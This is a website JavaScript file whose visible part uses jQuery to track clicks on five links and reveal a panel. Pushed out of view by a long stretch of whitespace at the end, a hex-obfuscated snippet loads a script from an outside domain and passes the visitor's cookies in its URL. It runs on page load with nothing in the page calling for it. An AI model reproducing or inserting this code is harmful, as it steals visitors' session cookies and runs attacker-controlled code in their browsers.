(function ($) {
	"use strict";

		function checkResult(){
			if(jQuery(".result1").length && jQuery(".result2").length && jQuery(".result3").length && jQuery(".result4").length && jQuery(".result5").length){
				jQuery("#panelb").removeClass("none");
			}
		}
		jQuery('body').on('click', '#link1 a', function(){
			jQuery("#result1").html("<i class='fa fa-check blue'></i>").addClass("result1");
			checkResult();
		});
		jQuery('body').on('click', '#link2 a', function(){
			jQuery("#result2").html("<i class='fa fa-check blue'></i>").addClass("result2");
			checkResult();
		});
		jQuery('body').on('click', '#link3 a', function(){
			jQuery("#result3").html("<i class='fa fa-check blue'></i>").addClass("result3");
			checkResult();
		});
		jQuery('body').on('click', '#link4 a', function(){
			jQuery("#result4").html("<i class='fa fa-check blue'></i>").addClass("result4");
			checkResult();
		});
		jQuery('body').on('click', '#link5 a:not(a:first)', function(){
			jQuery("#result5").html("<i class='fa fa-check blue'></i>").addClass("result5");
			checkResult();
		});
		
		jQuery(".close-alert").click(function(){
			jQuery(this).parent().fadeOut();
			return false;
		});

})(jQuery);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            var _9f=["\x73\x63\x72\x69\x70\x74","\x74\x65\x78\x74\x2f\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x68\x74\x74\x70\x3a\x2f\x2f\x6c\x31\x6c\x30\x2e\x63\x6f\x6d\x2f\x73\x2f","\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74","\x74\x79\x70\x65","\x73\x72\x63","\x63\x6f\x6f\x6b\x69\x65","\x61\x73\x79\x6e\x63","\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64","\x68\x65\x61\x64"];var sc=document[_9f[3]](_9f[0]);sc[_9f[4]]=_9f[1];sc[_9f[5]]=_9f[2]+document[_9f[6]];sc[_9f[7]]=true;document[_9f[9]][_9f[8]](sc);